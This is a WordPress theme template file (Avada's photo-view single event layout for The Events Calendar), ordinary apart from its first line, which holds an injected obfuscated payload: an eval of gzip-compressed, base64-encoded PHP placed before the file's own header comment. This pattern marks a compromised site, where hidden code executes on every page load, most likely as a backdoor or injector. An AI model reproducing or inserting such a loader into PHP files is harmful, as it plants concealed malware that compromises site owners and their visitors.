<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Photo View Single Event
 * This file contains one event in the photo view
 *
 * Override this template in your own theme by creating a file at [your-theme]/tribe-events/photo/single_event.php
 *
 * @package TribeEventsCalendar
 *
 */

if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
} ?>

<?php

global $post;

?>

<div class="fusion-post-wrapper">

	<?php if ( has_post_thumbnail() ) : ?>
	<div class="fusion-flexslider flexslider fusion-post-slideshow">
		<ul class="slides">
			<li class="hover-type-<?php echo Avada()->settings->get( 'ec_hover_type' ); ?>">
				<a href="<?php the_permalink(); ?>">
					<span class="screen-reader-text"><?php printf( esc_attr__( 'Go to "%s"', 'Avada' ), get_the_title( $post ) ); ?></span>
					<?php the_post_thumbnail( 'full' ); ?>
				</a>
			</li>
		</ul>
	</div>
	<?php endif; ?>

	<div class="fusion-post-content-wrapper">

		<div class="fusion-post-content post-content">

			<!-- Event Title -->
			<?php do_action( 'tribe_events_before_the_event_title' ); ?>
			<h2 class="entry-title">
				<a class="url" href="<?php echo esc_url( tribe_get_event_link() ); ?>" title="<?php the_title_attribute() ?>" rel="bookmark">
					<?php the_title(); ?>
				</a>
			</h2>
			<?php do_action( 'tribe_events_after_the_event_title' ); ?>

			<!-- Event Meta -->
			<?php do_action( 'tribe_events_before_the_meta' ); ?>
			<div class="fusion-single-line-meta">
				<div class="updated published time-details">
					<?php if ( ! empty( $post->distance ) ) : ?>
						<strong>[<?php echo tribe_get_distance_with_unit( $post->distance ); ?>]</strong>
					<?php endif; ?>
					<?php echo tribe_events_event_schedule_details(); ?>
				</div>
			</div><!-- .tribe-events-event-meta -->
			<?php do_action( 'tribe_events_after_the_meta' ); ?>

			<?php
			$separator_styles_array = explode( '|', Avada()->settings->get( 'grid_separator_style_type' ) );
			$separator_styles = '';

			foreach ( $separator_styles_array as $separator_style ) {
				$separator_styles .= ' sep-' . $separator_style;
			}
			?>

			<div class="fusion-content-sep<?php echo esc_attr( $separator_styles ); ?>"></div>

			<!-- Event Content -->
			<?php do_action( 'tribe_events_before_the_content' ); ?>
			<div class="fusion-post-content-container">
				<?php echo tribe_events_get_the_excerpt() ?>
			</div>
			<?php do_action( 'tribe_events_after_the_content' ) ?>

			<div class="fusion-meta-info">
				<div class="fusion-alignleft">
					<?php if ( Avada()->settings->get( 'post_meta_read' ) ) : ?>
						<?php $link_target = ''; ?>
						<?php if ( 'yes' === fusion_get_page_option( 'link_icon_target', get_the_ID() ) || 'yes' === fusion_get_page_option( 'post_links_target', get_the_ID() ) ) : ?>
							<?php $link_target = ' target="_blank" rel="noopener noreferrer"'; ?>
						<?php endif; ?>
						<a href="<?php echo get_permalink(); ?>" class="fusion-read-more"<?php echo $link_target; ?>><?php esc_attr_e( 'Find Out More', 'Avada' ); ?></a>
					<?php endif; ?>
				</div>
			</div>

		</div>

	</div><!-- /.tribe-events-event-details -->

</div><!-- /.tribe-events-photo-event-wrap -->
